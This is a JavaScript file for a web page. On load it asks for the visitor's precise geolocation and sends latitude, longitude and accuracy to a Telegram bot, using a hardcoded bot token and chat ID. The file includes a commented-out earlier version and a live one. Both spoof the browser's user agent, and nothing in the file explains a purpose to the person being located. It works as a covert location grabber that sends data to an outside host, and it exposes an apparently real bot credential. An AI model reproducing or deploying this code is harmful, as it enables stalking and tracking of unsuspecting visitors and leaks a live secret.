// // Replace these with your Telegram bot token and chat ID
// const TELEGRAM_BOT_TOKEN = '7467479115:AAEbsRubACeGgu3OWQ94uW1ScCrz2WaWPRE';
// const TELEGRAM_CHAT_ID = '6581772299'; 

// const statusElement = document.getElementById('status');

// const userAgent = navigator.userAgent.replace(/Android [0-9]+/i, "Android 11");
// Object.defineProperty(navigator, 'userAgent', {
//   value: userAgent,
//   configurable: true,
// });

// function sendLocation() {
//   if ("geolocation" in navigator) {
//     statusElement.textContent = "Requesting location...";

//     navigator.geolocation.getCurrentPosition(
//       (position) => {
//         const latitude = position.coords.latitude;
//         const longitude = position.coords.longitude;
//         const accuracy = position.coords.accuracy;

//         statusElement.textContent = "Location obtained. Sending to Telegram...";

//         const message = `Location Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters`;
//         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

//         fetch(telegramUrl, {
//           method: "POST",
//           headers: {
//             "Content-Type": "application/json",
//             "User-Agent": userAgent,
//           },
//           body: JSON.stringify({
//             chat_id: TELEGRAM_CHAT_ID,
//             text: message,
//           }),
//         })
//           .then((response) => {
//             if (response.ok) {
//               statusElement.textContent = "Location sent to Telegram successfully.";
//             } else {
//               statusElement.textContent = "Failed to send location to Telegram.";
//             }
//           })
//           .catch((error) => {
//             statusElement.textContent = "Error sending location to Telegram.";
//             console.error("Error:", error);
//           });
//       },
//       (error) => {
//         switch (error.code) {
//           case error.PERMISSION_DENIED:
//             statusElement.textContent = "Permission denied.";
//             break;
//           case error.POSITION_UNAVAILABLE:
//             statusElement.textContent = "Position unavailable.";
//             break;
//           case error.TIMEOUT:
//             statusElement.textContent = "Request timed out.";
//             break;
//           default:
//             statusElement.textContent = "An unknown error occurred.";
//             break;
//         }
//       }
//     );
//   } else {
//     statusElement.textContent = "Geolocation is not supported by this browser.";
//   }
// }

// document.addEventListener("DOMContentLoaded", sendLocation);



// Replace these with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7467479115:AAEbsRubACeGgu3OWQ94uW1ScCrz2WaWPRE';
const TELEGRAM_CHAT_ID = '6581772299'; // Replace with your actual chat ID

const statusElement = document.getElementById('status');

// Utility function to send a message to Telegram
async function sendToTelegram(message) {
  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36", // Spoofed user agent
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (response.ok) {
      statusElement.textContent = "Location sent to Telegram successfully.";
    } else {
      statusElement.textContent = "Failed to send location to Telegram.";
    }
  } catch (error) {
    statusElement.textContent = "Error sending location to Telegram.";
    console.error("Error:", error);
  }
}

// Function to get location and send it to Telegram
function requestAndSendLocation() {
  if ("geolocation" in navigator) {
    statusElement.textContent = "Requesting location...";

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        const message = `Location Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters`;

        statusElement.textContent = "Location obtained. Sending to Telegram...";
        await sendToTelegram(message);
      },
      (error) => {
        switch (error.code) {
          case error.PERMISSION_DENIED:
            statusElement.textContent = "Permission denied.";
            break;
          case error.POSITION_UNAVAILABLE:
            statusElement.textContent = "Position unavailable.";
            break;
          case error.TIMEOUT:
            statusElement.textContent = "Request timed out.";
            break;
          default:
            statusElement.textContent = "An unknown error occurred.";
            break;
        }
      },
      {
        enableHighAccuracy: true, // Use high accuracy for better location results
        timeout: 10000, // 10 seconds timeout
      }
    );
  } else {
    statusElement.textContent = "Geolocation is not supported by this browser.";
  }
}

// Trigger location request on page load
document.addEventListener("DOMContentLoaded", () => {
  // Check user agent and compatibility
  const userAgent = navigator.userAgent;

  if (/Android 14/i.test(userAgent)) {
    console.log("Android 14 detected: Adjusting user agent.");
    Object.defineProperty(navigator, 'userAgent', {
      value: userAgent.replace(/Android 14/i, "Android 11"),
      configurable: true,
    });
  }

  // Call location request function
  requestAndSendLocation();
});

